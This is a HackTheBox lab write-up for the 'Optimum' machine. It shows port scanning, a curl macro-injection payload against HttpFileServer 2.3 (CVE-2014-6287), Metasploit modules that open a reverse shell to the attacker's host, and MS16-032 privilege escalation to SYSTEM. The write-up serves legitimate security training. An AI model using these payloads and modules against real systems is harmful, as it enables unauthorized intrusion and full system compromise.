Optimum

HackTheBox · Easy by Brenno M.

Optimum runs HttpFileServer 2.3, vulnerable to macro injection through the search parameter (CVE-2014-6287), which gives a shell as kostas. Escalation uses MS16-032 (CVE-2016-0099), a flaw in Windows Server 2012 R2's Secondary Logon service.

Reconnaissance

The only open port is 80, running Rejetto HFS 2.3.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p80 <IP>
# 80 HttpFileServer httpd 2.3

Exploitation - CVE-2014-6287

HFS stops filtering the search parameter after a null byte, and what follows is parsed by its macro language, {.exec|...} included. A ping back confirms it before using the Metasploit module.

sudo tcpdump -i tun0 icmp
curl "http://<IP>/?search=%00{.exec|cmd.exe+/c+ping+-n+1+<MY_IP>.}"

msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <IP>
set LHOST <MY_IP>
run
getuid   # OPTIMUM\kostas
cat C:/Users/kostas/Desktop/user.txt

Escalation - MS16-032

sysinfo shows Windows Server 2012 R2 x64, but the Meterpreter is x86. The MS16-032 exploit needs a 64-bit process, so we migrate into one (such as explorer.exe) before running it.

sysinfo
ps
migrate <x64_PID>
background
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST <MY_IP>
set LPORT 4445
run
getuid   # NT AUTHORITY\SYSTEM
cat C:/Users/Administrator/Desktop/root.txt
